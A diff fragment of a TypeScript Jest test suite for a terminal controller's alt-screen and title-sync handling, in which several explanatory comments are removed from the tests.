     const ret = altEnter([1049]);
     expect(ret).toBe(false);
 
-    // Wait for the async IPC response to be handled
     await Promise.resolve();
     await Promise.resolve();
 
@@ -2350,7 +2181,7 @@ describe("services/terminal controller — OSC title sync", () => {
   });
 
   it("alt-enter RPC가 빈 이름 반환 시 기존 title 보존 (RPC 실패 fallback)", async () => {
-    mockForegroundProcessName = ""; // fallback
+    mockForegroundProcessName = "";
     const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
     const harness = makeTerminalControllerDeps();
     const controller = createTerminalController(
@@ -2376,7 +2207,7 @@ describe("services/terminal controller — OSC title sync", () => {
     expect(updated.title).toBe("Terminal");
 
     controller.dispose();
-    mockForegroundProcessName = "lazygit"; // restore default
+    mockForegroundProcessName = "lazygit";
   });
 
   it("alt-enter param이 47/1047/1049 외면 RPC 호출 안 함 (cursor show 등 다른 ?h 시퀀스 가드)", async () => {
@@ -2396,7 +2227,7 @@ describe("services/terminal controller — OSC title sync", () => {
     const altEnter = harness.getAltEnterHandler();
     if (!altEnter) throw new Error("alt-enter handler missing");
 
-    altEnter([25]); // DECTCEM cursor show — not our target
+    altEnter([25]);
     await Promise.resolve();
     await Promise.resolve();
 
